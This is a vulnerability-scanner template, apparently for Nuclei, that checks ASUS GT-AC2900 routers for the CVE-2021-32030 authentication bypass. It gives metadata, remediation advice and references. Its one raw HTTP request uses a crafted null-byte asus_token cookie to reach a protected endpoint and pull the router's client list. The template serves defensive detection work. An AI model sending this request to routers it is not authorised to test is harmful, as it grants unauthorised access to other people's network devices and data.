id: CVE-2021-32030

info:
  name: ASUS GT-AC2900 - Authentication Bypass
  author: gy741
  severity: critical
  description: "ASUS GT-AC2900 devices before 3.0.0.4.386.42643 allows authentication bypass when processing remote input from an unauthenticated user, leading to unauthorized access to the administrator application. This relates to handle_request in router/httpd/httpd.c and auth_check in web_hook.o. An attacker-supplied value of '\0' matches the device's default value of '\0' in some situations."
  remediation: |
    Apply the latest firmware update provided by ASUS to fix the authentication bypass vulnerability (CVE-2021-32030).
  reference:
    - https://www.atredis.com/blog/2021/4/30/asus-authentication-bypass
    - https://nvd.nist.gov/vuln/detail/CVE-2021-32030
    - https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md
    - https://www.asus.com/Networking-IoT-Servers/WiFi-Routers/ASUS-Gaming-Routers/RT-AC2900/HelpDesk_BIOS/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-32030
    cwe-id: CWE-287
    epss-score: 0.61922
    epss-percentile: 0.97505
    cpe: cpe:2.3:o:asus:gt-ac2900_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: asus
    product: gt-ac2900_firmware
  tags: cve,cve2021,asus,auth-bypass,router

http:
  - raw:
      - |
        GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1
        Host: {{Hostname}}
        User-Agent: asusrouter--
        Referer: {{BaseURL}}
        Cookie: asus_token=\0Invalid; clickedItem_tab=0

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - application/json

      - type: word
        words:
          - "get_cfg_clientlist"
          - "alias"
          - "model_name"
        condition: and

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100d955ec39bd3431f4a42b2eeb11da3d5b5fa32a0e522e094d25ec570e0c93c25e022100c5ee6e2aa8a59cec4e55440e0495006c47a933bc22cb6a8bc81507ddf2195972:922c64590222798bb761d5b6d8e72950